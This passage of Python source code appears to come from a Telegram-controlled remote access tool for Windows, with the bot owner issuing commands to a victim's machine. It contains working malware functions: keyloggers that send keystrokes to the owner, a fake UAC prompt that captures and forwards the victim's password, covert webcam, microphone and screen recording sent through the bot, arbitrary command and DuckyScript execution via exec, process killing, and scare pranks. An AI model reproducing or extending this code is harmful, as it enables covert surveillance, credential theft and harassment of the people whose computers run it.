                self.bsend(f"📥 Preparing download for `{path}`")

                #this is used as a check cause somethimes the cwd is not properly captured and executing another command does the job. And cd almost looks good in it. 
                self.cmd_session.write_input("cd")
                sleep(4)  # I love working with processes..

                filepath = join(self.cmd_session.cwd, path)
                self.bsend(f"📦 Starting download for `{filepath}`")

                download_thread = Thread(target=self.download_file, args=(filepath,))
                download_thread.start()
                download_thread.join()

                self.bsend(f"✅ Download completed for `{filepath}`")

            else:
                self.cmd_session.write_input(command)
                self.bsend(f"▶️ Command sent: `{command}`")

    def cantopen(self, process: str) -> None:
        self.cantopenlist.append(process)
        self.bsend(f"🔒 Added {process} to cantopenlist.")

    def cantopenkiller(self) -> None:
        while self.running:
            for process in self.cantopenlist:
                if self.check_if_proc_running(process):
                    terminate_process_by_name(process)
            sleep(1)

    def cantopenmenu(self) -> None:
        if self.cantopenlist:
            dict_menu = { proc:f"/cantopenremove {proc}" for proc in self.cantopenlist}
            menu = self.new_menu(dict_menu, close_btn_lab="CANTOP_close")
            self.cantopenmenu_ref = menu
        else:
            self.bsend("Cantopenlist is empty.")

    def check_if_proc_running(self, processname) -> bool:
        return processname.lower().strip() in [x.name().lower().strip() for  x in psutil.process_iter()]

    def checkforface(self) -> None:
        res, frame = detect_face(self.cap)
        if res:
            self.bsend("Face found")
        else:
            self.bsend("Face not found")

    def clear(self) -> None:
        self.closecap()
        for file in listdir(BURN_DIRECTORY):
            try:
                if isfile(file):
                    remove(file)
            except:
                pass#ignore file errors
        destroyAllWindows()
        try:
            self.hdmiDrownerOverlayPlayer.stop()
        except:
            ...
        self.audio_mixer.mute()
        #self.restore_wallpaper()
        self.cantopenlist.clear()

    def closecap(self) -> None:
        if self.cap.isOpened():
            self.cap.release()

    def distorted_screen(self) -> None:
        self.modded_screenshot(lambda x: distorted_screen(x, randint(20, 40), randint(50, 55)))

    def display_mode(self) -> None:
        buttons = {
            "Only PC"      : "/execute DisplaySwitch.exe /internal",
            "Only External": "/execute DisplaySwitch.exe /external",
            "Clone"        : "/execute DisplaySwitch.exe /clone",
            "Extend"       : "/execute DisplaySwitch.exe /extend",
        }
        self.display_mode_keyboard = self.new_menu(buttons, close_btn_lab="DISPLAYSET_close")

    def delete_message(self, message_id: int) -> None:
        try:
            self.bot.deleteMessage((self.owner_id, message_id))
        except TelegramError:
            ...

    def deletemessages(self, number: int = 1) -> None:
        message_ids = self.all_session_messages[-number:]
        for message_id in message_ids:
            self.delete_message(message_id)
    
    def deleteallmessages(self) -> None:
        for message_id in self.all_session_messages:
            self.delete_message(message_id)

    def execute(self, *command, return_output: bool=False, shell: bool=False) -> None:
        command = " ".join(command)
        s = sp.run(command, shell=shell, stdout=sp.PIPE, stderr=sp.PIPE, encoding="cp850")
        if s.returncode:
            output = s.stderr
        else:
            output = s.stdout

        if output:
            if return_output:
                return output
            else:
                self.bsend(f"Output: {output}")

    def extract_commands(self) -> list[dict]:
        return [{"command":c.name, "description":c.description} for c in self.commands]

    def fake_shutdown(self) -> None:
        system('shutdown /s /t 34 /c "Windows Error 104e240-69, please notify the administrator"')
        sleep(5)
        system("shutdown -a")

    def fakeuac(self) -> None:
        proc = sp.run(fake_uac_prompt_path, stdout=sp.PIPE, stderr=sp.PIPE)
        if proc.returncode:
            output = proc.stderr
        else:
            output = proc.stdout
        uacfiles = filter(lambda x:x.endswith(".fuac"), listdir())
        for file in uacfiles:
            with open(file, "r") as fi:
                password = fi.read().strip()
                self.bsend(f"Password: ||{password}||",parse_mode="MarkdownV2")
            remove(file)

    def gabinetti(self) -> None:
        self.jumpscare("plankton_meme", "gabinetti")

    def handle(self, msg: str) -> None:
        content_type, chat_type, chat_id = glance(msg)
        if chat_id in self.strangers:
            return
        sender_name = msg["from"]["first_name"]
        message_id = msg["message_id"]
        user = msg['from']
        username = user.get('username')

        if content_type != "pinned_message":
            self.all_session_messages.append(message_id)

        if chat_id == self.owner_id:
            self.owner_name = sender_name

            if content_type == "text":
                self.parse_text(msg)
            elif content_type == "photo":
                self.parse_photo(msg)
            elif content_type == "document":
                self.parse_document(msg)
            elif content_type == "video":
                self.parse_document(msg, mimetype="video")
            elif content_type in ("voice", "audio"):
                Thread(target=self.parse_audio, args=(msg, )).start()
            elif content_type == "pinned_message":
                self.delete_message(message_id)
            elif content_type == "video_note":
                Thread(target=self.parse_document, args=(msg, "video_note")).start()
            else:
                self.bsend(f"Unparsed content-type: {content_type}")
        else:
            # Handling strangers
            stranger_message = f"What do you want {sender_name}, @{username} `{chat_id}`, I don't work for you."
            self.bot.sendMessage(chat_id, stranger_message)
            self.bsend(f"Message from {sender_name} @{username} `{chat_id}`:\n{msg.get('text')}")
            self.strangers.append(chat_id)

    def inverted_screen(self) -> None:
        self.modded_screenshot(invert_image)

    def getip(self):
        output = get_public_ip()
        self.bsend(f"🌐 Public IP: {output}")


    def get_disk_info(self):
        disks = get_disk_info()
        full_message = "\n".join(map(format_disk, disks))
        self.bsend(full_message, parse_mode="HTML")

    def johnpork(self, audio=True) -> None:
        self.jumpscare("johnpork_meme", "johnpork", playaudio=audio, setvolume=100)

    def johnporknoaudio(self) -> None:
        self.johnpork(False)

    def jumpscare(self, image=None, audio=None, playaudio=True, showimage=True, setvolume: int=100) -> None:
        old_volume = self.audio_mixer.getVolumePercentage()
        self.audio_mixer.setVolumePercentage(setvolume)
        if image is None:
            image = self.images[choice(list(self.nomemes))]
        else:
            if image in self.images:
                image = self.images[image]
            else:
                image = imread(image)
        if audio is None:
            audio = self.audios["ghost-roar"]
        else:
            audio = self.audios[audio]
        imageThread = Thread(target=show_image_fullscreen ,args=(image,))

        if showimage:
            imageThread.start()
        if playaudio:
            play_wav(audio)
        if showimage:
            imageThread.join()
        self.audio_mixer.setVolumePercentage(old_volume)

    def jumpscarenoaudio(self) -> None:
        self.jumpscare(playaudio=False)

    def keylogger_to_buffer(self, state: dict["value":str,"running":bool]) -> None:
        while state["running"]:
            event = read_event()
            if event.event_type == KEY_DOWN:
                name = event.name
                if len(name) != 1:
                    if name == "space":
                        k=" "
                    elif name == "maiusc":
                        continue
                    elif name == "backspace":
                        state["value"]=state["value"][:-1]
                        continue
                    else:
                        k=f" <{name.upper()}> "
                else:
                    k = name
                state["value"]+=k

    def keylogger(self, timeout: int=10) -> None:
        buffer = ""
        start=time()
        loading_bar = self.new_loading_bar(timeout, f"{emoji_dict["keyboard"]} Keylogger with file", showperc=True)
        while (time()-start)<timeout:
            loading_bar.update(time()-start)
            if loading_bar.canceled:
                loading_bar.fill_and_delete()
                return
            event = read_event()
            if event.event_type == KEY_DOWN:
                name = event.name
                if len(name) != 1:
                    if name == "space":
                        k=" "
                    elif name == "maiusc":
                        continue
                    elif name == "backspace":
                        buffer = buffer[:-1]
                        continue
                    else:
                        k=f" <{name.upper()}> "
                else:
                    k = name
            buffer+=k
        filename = randomname()
        with open(filename, "w") as fo:
            fo.write(buffer)
        with open(filename, "r") as fi:
            self.bot.sendDocument(self.owner_id, (f"keylog{now()}.txt",fi))
        if isfile(filename):
            remove(filename)
        loading_bar.fill_and_delete()

    def leftclick(self) -> None:
        pg.leftClick()

    def live_keylogger(self, timeout=10) -> None:
        start = time()
        bar = self.new_loading_bar(timeout, label=f"📡 Live Keylogger")
        state = {"value":"📡 Live Keylogger Output: ",
                  "running":True}
        buffer_message = self.new_editable_message(state["value"])
        elapsed = 0
        Thread(target=self.keylogger_to_buffer, args=(state, )).start()
        while elapsed < timeout:
            if bar.canceled:
                bar.fill_and_delete()
                return
            elapsed = time()-start
            bar.update(elapsed)
            buffer_message.edit(state["value"])
        state["running"]=False
        bar.fill_and_delete()
        
    def load_plugins(self, bot: Bot, plugin_classes: list[type[Plugin]]) -> dict[str, dict[str, Callable]]:
        """
        Instantiate and bind all plugins, then export their commands for the bot.
        Returns a registry mapping button labels to (Command, action) tuples.
        """
        registry = {}

        for cls in plugin_classes:
            plugin = cls()
            plugin.bind_bot(bot)
            plugin.bind_pep(self)

            exported = plugin.export()
            registry.update(exported)

        for label, (command, action, description) in registry.items():
            if label == STARTUP_SCRIPT_MARKER:
                action()
                continue
            new_command = Command(name=command,
                                  function=action,
                                  description=description,
                                  category="🔌 PlugIns",
                                  label=label)
            self.commands.append(new_command)
            self.function_table.update({command:action})
        return registry


    def message_box(self, text: str, title: str = "Warning") -> int:
        def run():
            ctypes.windll.user32.MessageBoxW(0, text, title, 0x1000)
        Thread(target=run, daemon=True).start()

    def mixer_menu(self) -> None:
        buttons = {
            "🔊Full Volume":"/fullvolume",
            "🔉Half Volume":"/setvolume 50",
            "🔇Mute":"/mutevolume",
        }
        self.mixer_menu_keyboard = self.new_menu(buttons, close_btn_lab="MXR_close")

    def modded_screenshot(self, effect: Callable, timeout: int=1250) -> None:
        filename = join(BURN_DIRECTORY, randompngname())
        pg.screenshot(filename)
        img = imread(filename)
        modded_img = effect(img)
        show_image_fullscreen(modded_img, timeout)

    def mousecontroller(self) -> None:
        menu = {
            "LEFT CLICK":"/leftclick", "UP":"/mouseu","RIGHTCLICK":"/rightclick",
            "LEFT":"/mousel","DOWN":"/moused","RIGHT":"/mouser"
        }
        self.mouse_controller_menu = self.new_menu(menu, label=f"{emoji_dict['mouse']} Mouse Control", rows=3, close_btn_lab="MOUSE_closemenu")

    def setMouseJump(self, jump: int= None) -> None:
        if jump is None:
            jmp = self.send_prompt("Set mouse jump: ")
        if jmp.isnumeric():
            jmp = int(jmp)
            if jmp < 1:
                self.bsend("Mouse jump mouse be above 0.")
            self.MOUSE_JMP = jmp
        else:
            self.bsend("Mouse jump must be numeric.")

    def moused(self) -> None:
        pos = pg.position()
        pg.moveTo(pos[0], pos[1]+self.MOUSE_JMP)

    def mousel(self) -> None:
        pos = pg.position()
        pg.moveTo(pos[0]-self.MOUSE_JMP, pos[1])

    def mouser(self) -> None:
        pos = pg.position()
        pg.moveTo(pos[0]+self.MOUSE_JMP, pos[1])

    def mouseu(self) -> None:
        pos = pg.position()
        pg.moveTo(pos[0], pos[1]-self.MOUSE_JMP)

    def mouselock(self, timer: int=6) -> None:
        bar = self.new_loading_bar(timer, label=f"{emoji_dict['mouse']} Mouselock")
        start = time()
        pos = pg.position()
        time_elapsed = 0
        while timer > time_elapsed:
            time_elapsed = time()-start
            bar.update(time_elapsed)
            pg.moveTo(pos)
        bar.fill_and_delete()

    def mainmenu(self):
        buttons = {}
        for category, label, submenu in [
            ("🛑 System", "🛑 System & Shutdown", "/menu_system"),
            ("🌐 Network", "🌐 Network & Remote Access", "/menu_network"),
            ("📸 Camera", "📸 Camera & Screen", "/menu_camera"),
            ("🔊 Audio", "🔊 Audio & Volume", "/menu_audio"),
            ("🎵 Sound FX", "🎵 Sound Effects", "/menu_soundfx"),
            ("😈 Pranks", "😈 Pranks & Visuals", "/menu_pranks"),
            ("💻 System Control", "💻 System Control", "/menu_control"),
            ("🎮 Input", "🎮 Input / Device Control", "/menu_input"),
            ("📋 Messaging", "📋 Messaging", "/menu_messaging"),
            ("🔒 Can't Open", "🔒 Can't Open List", "/menu_cantopen"),
            ("🧠 Keylogger", "🧠 Keylogger", "/menu_keylogger"),
            ("🦑 Misc", "🦑 Misc", "/menu_misc"),
            ("🦆 DuckyScript", "🦆 DuckyScript", "/menu_duckyscript"),
            ("🔌 PlugIns", "🔌 Your Plugins", "/menu_plugins"),
        ]:
            buttons[label] = submenu

        if self.mainmenu_ref:
            self.mainmenu_ref.delete()

        self.mainmenu_ref = ButtonsMenu(
            chat_id=self.owner_id,
            bot=self.bot,
            buttons=buttons,
            label="Select a category:",
            close_btn_lab="mainmenu_close",
            next_btn=True,
            next_btn_lab="mainmenu_next",
            prev_btn_lab="mainmenu_prev"
        )
        return self.mainmenu_ref

    # Generic submenu generator
    def generate_category_menu(self, category_name: str, menu_label: str = None) -> ButtonsMenu:
        buttons = {"🔙 Back": "/mainmenu"}
        for cmd in [c for c in self.commands if c.category == category_name]:
            buttons[cmd.label] = f"/{cmd.name}"

        if self.mainmenu_ref:
            self.mainmenu_ref.delete()

        self.mainmenu_ref = ButtonsMenu(
            chat_id=self.owner_id,
            bot=self.bot,
            buttons=buttons,
            label=menu_label or category_name,
            close_btn_lab="mainmenu_close",
            next_btn=True,
            next_btn_lab="mainmenu_next",
            prev_btn_lab="mainmenu_prev"
        )
        return self.mainmenu_ref
    
    """
    ooo        ooooo
    `88.       .888'
    888b     d'888   .ooooo.  ooo. .oo.   oooo  oooo   .oooo.o
    8 Y88. .P  888  d88' `88b `888P"Y88b  `888  `888  d88(  "8
    8  `888'   888  888ooo888  888   888   888   888  `"Y88b.
    8    Y     888  888    .o  888   888   888   888  o.  )88b
    o8o        o888o `Y8bod8P' o888o o888o  `V88V"V8P' 8""888P'
    """

    def menu_system(self):
        return self.generate_category_menu("🛑 System", "🛑 System & Shutdown")

    def menu_network(self):
        return self.generate_category_menu("🌐 Network", "🌐 Network & Remote Access")

    def menu_camera(self):
        return self.generate_category_menu("📸 Camera", "📸 Camera & Screen")

    def menu_audio(self):
        return self.generate_category_menu("🔊 Audio", "🔊 Audio & Volume")

    def menu_soundfx(self):
        return self.generate_category_menu("🎵 Sound FX", "🎵 Sound Effects")

    def menu_pranks(self):
        return self.generate_category_menu("😈 Pranks", "😈 Pranks & Visuals")

    def menu_control(self):
        return self.generate_category_menu("💻 System Control", "💻 System Control")

    def menu_input(self):
        return self.generate_category_menu("🎮 Input", "🎮 Input / Device Control")

    def menu_messaging(self):
        return self.generate_category_menu("📋 Messaging", "📋 Messaging")

    def menu_cantopen(self):
        return self.generate_category_menu("🔒 Can't Open", "🔒 Can't Open List")

    def menu_keylogger(self):
        return self.generate_category_menu("🧠 Keylogger", "🧠 Keylogger")

    def menu_misc(self):
        return self.generate_category_menu("🦑 Misc", "🦑 Misc")

    def menu_plugins(self):
        return self.generate_category_menu("🔌 PlugIns", "🔌 Your Plugins")

    def menu_ducky(self):
        buttons = {
            i:f"/duckyscript {i}" for i in KEYMAP.keys()
        }
        return self.new_menu(buttons)


    def new_editable_message(self, content: str, autosend: bool=True) -> EditableMessage:
        editable = EditableMessage(self.bot, self.owner_id, content, autosend)
        self.all_session_messages.append(editable.message_id)
        return editable

    def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=False, label=None) -> LoadingBar:
        loadingbar = LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc, label=label, full_char=self.loading_bar_set[0], empty_char=self.loading_bar_set[1], spinner_frames=self.loading_bar_spinner, spinner_pos="right", bar_lenght=10, cancel_button=True) 
        self.bars.update({id(loadingbar):loadingbar})
        return loadingbar

    def new_loading_bar_timed_worker(self, duration: int, target: Callable, args: tuple=()) -> None:
        loadingbar_tw = LoadingBarTimedWorker(duration=duration, chat_id=self.owner_id, bot=self.bot, target=target, args=args, loading_bar_kwargs={
            "full_char":self.loading_bar_set[0],
            "empty_char":self.loading_bar_set[1],
            "spinner_frames":self.loading_bar_spinner,
            "spinner_pos":"right",
            "bar_lenght":10,
        })
        loadingbar = loadingbar_tw.get_loading_bar()
        self.bars.update({id(loadingbar):loadingbar})
        return loadingbar_tw

    def new_menu(self, menu: dict[str:Any], autosend: bool=True, label: str="Choose an option: ", page: int=0, next_btn: bool=False, next_btn_lab: str="next_page", prev_btn_lab: str="previus_page", close_btn_lab: str="close_page", rows=2) -> ButtonsMenu:
        menu = ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn, next_btn_lab=next_btn_lab, prev_btn_lab=prev_btn_lab, close_btn_lab=close_btn_lab, keyboard_rows=rows)
        self.all_session_messages.append(menu.message_id)
        return menu

    def on_callback_query(self, msg) -> None:
        query_id, from_id, data = glance(msg, flavor="callback_query")
        Thread(target=self.parse_command, args=(data, )).start()
        self.bot.answerCallbackQuery(query_id)

    def opencap(self) -> None:
        if not self.cap.isOpened():
            self.cap.open(0)

    def parse_audio(self, msg: dict) -> None:
        if 'voice' in msg:
            file_id = msg['voice']['file_id']
        elif 'audio' in msg:
            file_id = msg['audio']['file_id']
        file_info = self.bot.getFile(file_id)
        file_url = f"https://api.telegram.org/file/bot{self.token}/{file_info['file_path']}"
        filename = randomname()+".ogg"
        filepath = join(BURN_DIRECTORY, filename)
        response = requests.get(file_url)
        with open(filepath, "wb") as f:
            f.write(response.content) 
        new_filepath = ogg_to_wav(filepath, rmold=True)
        play_wav(new_filepath, False)
        remove(new_filepath)

    def parse_command(self, text: str) -> None:
        args = text.split()
        command = args[0]

        if command.startswith("/"):
            command = args[0][1:]
        function_args = args[1:]
        function_args = map(lambda x:x.replace("<SPACE>"," "), function_args)
        function_args = list(map(lambda x: int(x) if x.isdigit() else x, function_args))

        func = self.function_table.get(command)
        if func:
            function_needed_args = get_required_params(func)
            if function_needed_args:
                if function_needed_args[0] == "self":
                    function_needed_args=function_needed_args[1:]
                
            function_all_args = get_function_parameters(func)
            if function_all_args:
                if function_all_args[0] == "self":
                    function_all_args=function_all_args[1:]

            try:
                if func in self.no_background_functions:
                    func(*function_args)
                else:
                    skip_len = False
                    if "*args" in function_all_args:
                        skip_len = True
                    if (len(function_args) < len(function_needed_args) or len(function_args) > len(function_all_args)) and not(skip_len):
                        raise TypeError("Wrong number of arguments for this function")
                    if function_args:
                        thread_args = (*function_args,)
                        new_thread = Thread(target=func, args=thread_args)
                    else:
                        new_thread = Thread(target=func)
                    new_thread.start()
            except TypeError as e:
                args = {} 
                for arg in function_needed_args:
                    if arg == "self":
                        continue
                    response = self.send_prompt(f"Choose a {arg} for {command}")
                    response = response.replace(" ","<SPACE>")
                    args[arg] = response
                self.parse_command(f"/{command} " + " ".join(args.values()))
            except Exception as e:
                self.bsend(f"Unhandled error for function {command}\n{e}")

        elif command.startswith("PK"):
            if command == "PK_next_page" and self.process_explorer_menu:
                self.process_killer_page += 1
                self.process_killer(page=self.process_killer_page)
            elif command == "PK_previous_page" and self.process_explorer_menu:
                self.process_killer_page -= 1
                self.process_killer(page=self.process_killer_page)
            elif command == "PK_close_page" and self.process_explorer_menu:
                self.process_explorer_menu.delete()
            elif command in ("PK_next_page", "PK_previous_page") and not self.process_explorer_menu:
                self.bsend("Use /processkiller first")

        elif command.startswith("DISPLAYSET"):
            if command == "DISPLAYSET_close":
                if self.display_mode_keyboard:
                    self.display_mode_keyboard.delete()
                    self.display_mode_keyboard = None

        elif command.startswith("MOUSE"):
            if command == "MOUSE_closemenu":
                if self.mouse_controller_menu:
                    self.mouse_controller_menu.delete()
                    self.mouse_controller_menu = None

        elif command.startswith("MXR"):
            if command == "MXR_close":
                if self.mixer_menu_keyboard:
                    self.mixer_menu_keyboard.delete()
                    self.mixer_menu_keyboard = None

        elif command.startswith("PROCMON"):
            if self.processmonitormenu:
                if command == "PROCMON_close":
                    self.processmonitormenu.delete()
                    self.processmonitormenu = None
                elif command.startswith("PROCMON_procmonrem"):
                    process = function_args[0]
                    self.processmonitorrem(process)
                    self.processmonitormenu.delete()
                    self.processmonitormenushow()

        elif command.startswith("CANTOP"):
            if command == "CANTOP_close":
                self.cantopenmenu_ref.delete()
                self.cantopenmenu_ref = None

        elif command.startswith("mainmenu"):
            if self.mainmenu_ref:
                if command == "mainmenu_close":
                    self.mainmenu_ref.delete()
                    self.mainmenu_ref = None
                elif command == "mainmenu_next":
                    self.mainmenu_ref.delete()
                    self.mainmenu_ref.send_next_page()
                elif command == "mainmenu_prev":
                    self.mainmenu_ref.delete()
                    self.mainmenu_ref.send_previous_page()

        elif command.startswith("cancel_loading"):
            bar_id = int(command.split(":")[1])
            if bar_id in self.bars:
                self.bars[bar_id].canceled = True
                del self.bars[bar_id]
        else:
            self.bsend(f"Invalid command {command}")
    
    def parse_video_note(self, saved_filepath: str) -> None:
        self.overlay_tk.video_note_overlay(saved_filepath)

    def parse_video(self, msg, document, saved_filepath: str, saved_filename: str) -> None:
        caption = msg["caption"].lower().strip()
        if caption == "/setvideowallpaper":
            if not self.confirmContuinuingWithoutWallpaperBackup():
                return
            duration = document["duration"]
            video_stream = VideoCapture(saved_filepath)
            res = True
            start=time()
            while res and (time()-start)<=duration:
                res, frame = video_stream.read()
                imwrite("tmp.png", frame)
                change_wallpaper(abspath("tmp.png"))
            remove("tmp.png")
            self.restore_wallpaper()
        
        elif caption.startswith("/save"):
            try:
                args = caption.split()
                if len(args)>1:
                    filepath = " ".join(caption.split()[1:])
                    containts_filename = "." in pathsplit(filepath)[-1]
                    if containts_filename:
                        rename(saved_filepath, filepath)
                    else:
                        rename(saved_filepath, join(filepath, saved_filename+".mp4"))
                    self.bsend(f"{emoji_dict['file']} File saved successfully.")
                    return
            except Exception as e:
                self.bsend(f"{emoji_dict['file']} Could not save the file. {e}")
                return

    def parse_document(self, msg: dict[str:str], mimetype: str="document") -> None:
        document = msg[mimetype]
        file_id = document["file_id"]
        saved_filename = randomname()
        saved_filepath = join(BURN_DIRECTORY, saved_filename)
        self.bot.download_file(file_id, saved_filepath)
        if mimetype == "document": 
            filename = document["file_name"]
            if filename.endswith(".dd"):
                with open(saved_filepath, "r") as fi:
                    content = fi.read()
                payload_python = toducky(content)
                self.bsend(f"Executing duckyscript {filename}({saved_filename})")
                exec(payload_python)
                remove(saved_filepath)

        elif mimetype == "video":
            self.parse_video(msg, document, saved_filepath, saved_filename)

        elif mimetype == "video_note":
            print("VIDEO NOTE")
            self.parse_video_note(saved_filepath)


    def parse_photo(self, msg: dict) -> None:
        filename = randompngname()
        saved_filepath = join(BURN_DIRECTORY, filename)
        self.bot.download_file(msg['photo'][-1]['file_id'], saved_filepath)
        if "caption" in msg.keys():
            caption = msg["caption"]
            if caption == "/jumpscare":
                self.jumpscare(saved_filepath)
                return

            elif caption.startswith("/save"):
                try:
                    args = caption.split()
                    if len(args)>1:
                        filepath = " ".join(caption.split()[1:])
                        containts_filename = "." in pathsplit(filepath)[-1]
                        if containts_filename:
                            rename(saved_filepath, filepath)
                        else:
                            rename(saved_filepath, join(filepath, filename))
                        self.bsend(f"{emoji_dict['file']} File saved successfully.")
                        return
                except Exception as e:
                    self.bsend(f"{emoji_dict['file']} Could not save the file. {e}")
                    return

        Thread(target=self.show_image, args=[filepath,]).start()
        sleep(0.5)
        remove(filepath)

    def parse_text(self, msg: dict) -> None:
        text = msg["text"]
        date = int(msg["date"])
        if (date+self.message_timeout)<time():
            return
        if self.user["status"] is None:
            if text == "/start":
                return None
            elif ";" in text:
                commands = text.split(";")
                for command in commands:
                    self.parse_command(command) 
            else:
                self.parse_command(text)
        elif self.user["status"] == "input_requested":
            self.user["last_response"] = text.strip()

    def plankton(self, audio=True) -> None:
        self.jumpscare("plankton_meme", "plankton", playaudio=audio, setvolume=50)

    def planktonnoaudio(self) -> None:
        self.plankton(audio=False)
    
    def processmonitoradd(self, processname: str) -> None:
        self.bsend(f"💻 {processname} added to process monitor's list.")
        self.processmonitorlist.update({processname:False})
    
    def processmonitorrem(self, processname: str) -> None:
        try:
            del self.processmonitorlist[processname]
            self.bsend(f"💻 {processname} removed to process monitor's list.")
        except:
            self.bsend(f"💻 {processname} was not inside process monitor's list.")

    def processmonitormenushow(self) -> None:
        self.processmonitormenu = self.new_menu({
            x:f"PROCMON_procmonrem {x}" for x, _ in self.processmonitorlist.items()
        }, close_btn_lab="PROCMON_close")

    def processmonitorloop(self) -> None:
        while self.running:
            for process, checked in self.processmonitorlist.items():
                if self.check_if_proc_running(process) and not checked:
                    self.bsend(f"{process} is running.")
                    self.processmonitorlist[process]=True
                elif not(self.check_if_proc_running(process)):
                    self.processmonitorlist[process]=False
            sleep(2)

    def process_killer(self, page=0) -> None:
        if self.process_explorer_menu is None:
            self.process_killer_page = 0
        else:
            self.process_explorer_menu.delete()
            self.process_killer_page = page
        processes = [x.name() for x in psutil.process_iter()] 
        self.process_explorer_menu = self.new_menu({process:f"/terminateprocess {process}" for process in processes}, next_btn=True, autosend=True, page=self.process_killer_page, next_btn_lab="PK_next_page", prev_btn_lab="PK_previous_page", close_btn_lab="PK_close_page", rows=3)
        return self.process_explorer_menu

    def pss(self) -> None:
        self.__play_loaded_sound("pss")

    def behindyou_kid(self) -> None:
        self.__play_loaded_sound("behindyou_kid")

    def behindyou_whisper(self) -> None:
        self.__play_loaded_sound("behindyou_whisper")

    def scream_11s(self) -> None:
        self.__play_loaded_sound("scream_11s")

    def scream_15s(self) -> None:
        self.__play_loaded_sound("scream_15s")

    def playrandomnoise(self, duration: int) -> None:
        start = time()
        loading_bar = self.new_loading_bar(duration, label="Play Random Noise")
        thread = Thread(target=play_random_noise, args=(duration,))
        thread.start()
        while (time()-start) < duration:
            elapsed = int(time()-start)
            loading_bar.update(elapsed)
            if loading_bar.canceled:
                break
            sleep(1)
        loading_bar.fill_and_delete()

    def whisper_overlay(self, duration: int, whispers: str | list[str] | None = None) -> None:
        self.overlay_tk.whisper_overlay(duration, whispers)

    def knockknock(self) -> None:
        self.__play_loaded_sound("knockknock")

    def fart(self) -> None:
        self.__play_loaded_sound("fart")

    def fastscreenshot(self, caption=None) -> List[Any]:
        return [x for x in fast_screenshot(join(BURN_DIRECTORY, "tmp{mon}tmp.png"), lambda x:self.__send_image(x, caption=caption))]

    def replyquickmenu(self) -> int:
        commands = [f"/{c.name}" for c in self.commands]
        keyboard = [commands[i:i + 2] for i in range(0, len(commands), 2)]        
        return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)

    def randomkeyboard(self, timeout: int =5) -> None:
        start = time()
        loading_bar = self.new_loading_bar(timeout, label=f"{emoji_dict['keyboard']} Random Keyboard", showperc=True)
        while (time()-start)<timeout:
            loading_bar.update(time()-start)
            if loading_bar.canceled:
                loading_bar.fill_and_delete()
                return
            event = read_event()
            if event.event_type == KEY_DOWN:
                e = event.name.split()[0]
                if e in printable:
                    pg.press("backspace")
                    pg.write(choice(printable))
        loading_bar.set100()
        loading_bar.delete()

    def record_audio(self, filename, seconds, samplerate=48000) -> bool|Exception:
        try:
            seconds = float(seconds)
            frames = int(seconds * samplerate)
            data = sd.rec(frames, samplerate=samplerate, channels=1, dtype='int16')
            sd.wait()
            sf.write(filename, data, samplerate)
            return True
        except Exception as e:
            return e 

    def record_jumpscare_reaction(self, onlycamera=False) -> None:
        if onlycamera:
            recording_thread = Thread(target=self.record_webcam, args=(20,))
        else:
            recording_thread = Thread(target=self.record_webcam_and_screen, args=(20,))

        recording_thread.start()
        status_message = self.new_editable_message("Recording")
        sleep(10)
        self.jumpscare(playaudio=True)
        status_message.edit("Jumpscared!")
        recording_thread.join()
        status_message.delete()

    def record_screen(self, duration: int=10, caption: str|None=None) -> None:
        duration = int(duration)
        bar = self.new_loading_bar(duration, label=f"{emoji_dict['screen']} Recording Screen")
        try:
            filename = join(f"{BURN_DIRECTORY}", f"{randomname()}.mp4")
            audio_filename = join(f"{BURN_DIRECTORY}",f"{randomname()}.wav")
            SCREEN_SIZE = tuple(pg.size())
            fourcc = VideoWriter_fourcc(*'XVID')
            out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
            start_time = time()
            samplerate = 44100
            channels = 1
            frames = int(duration * samplerate)
            audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')

            time_elapsed = 0
            while int(time_elapsed) < duration:
                if bar.canceled:
                    bar.fill_and_delete()
                    return
                time_elapsed = time() - start_time
                bar.progress = time_elapsed
                bar.update()
                img = pg.screenshot()
                img = np.array(img)
                img = cvtColor(img, COLOR_BGR2RGB)
                out.write(img)
            bar.set100()

            sd.wait()
            out.release()
            sf.write(audio_filename, audio_data, samplerate)
            video_clip = VideoFileClip(filename)
            audio_clip = AudioFileClip(audio_filename)
            video_with_audio = video_clip.set_audio(audio_clip)
            final_filename = filename.replace(".mp4", "_final.mp4")
            video_with_audio.write_videofile(final_filename, logger=None)
            tmploadingmessage = self.new_editable_message("Sending recording...", True)
            with open(final_filename, "rb") as video:
                response = self.bot.sendVideo(self.owner_id, video, caption=caption)
                self.all_session_messages.append(response["message_id"])
            tmploadingmessage.delete()
            remove(filename)
            remove(audio_filename)
            remove(final_filename)
        except Exception as e:
            self.bsend(f"Error while recording screen: {e}")
        bar.fill_and_delete()

    def record_webcam(self, duration: int=10, caption: str|None=None) -> None:
        duration = int(duration)
        bar = self.new_loading_bar(duration, label=f"{emoji_dict['photo']} Recording Webcam")
        try:
            filename = join(f"{BURN_DIRECTORY}", f"{randomname()}.mp4")
            audio_filename = join(f"{BURN_DIRECTORY}",f"{randomname()}.wav")
            fourcc = VideoWriter_fourcc(*'XVID')
            self.opencap()
            webcam = self.cap
            width = int(webcam.get(CAP_PROP_FRAME_WIDTH))
            height = int(webcam.get(CAP_PROP_FRAME_HEIGHT))
            out = VideoWriter(filename, fourcc, 20.0, (width, height))
            start_time = time()
            samplerate = 44100
            channels = 1
            frames = int(duration * samplerate)
            audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')
            time_elapsed = 0
            while int(time_elapsed) < duration:
                if bar.canceled:
                    bar.fill_and_delete()
                    return
                time_elapsed = time() - start_time
                bar.progress = time_elapsed
                bar.update()
                ret, frame = webcam.read()
                if not ret:
                    break
                out.write(frame)
            bar.set100()
            sd.wait()
            out.release()
            self.closecap()
            sf.write(audio_filename, audio_data, samplerate)
            video_clip = VideoFileClip(filename)
            audio_clip = AudioFileClip(audio_filename)
            video_with_audio = video_clip.set_audio(audio_clip)
            final_filename = filename.replace(".mp4", "_final.mp4")
            video_with_audio.write_videofile(final_filename, logger=None)
            tmploadingmessage = self.new_editable_message("Sending recording...", True)
            with open(final_filename, "rb") as video:
                response = self.bot.sendVideo(self.owner_id, video, caption=caption)
                self.all_session_messages.append(response["message_id"])
            tmploadingmessage.delete()
            remove(filename)
            remove(audio_filename)
            remove(final_filename)
        except Exception as e:
            self.bsend(f"Error while recording webcam {e}")
        bar.fill_and_delete()

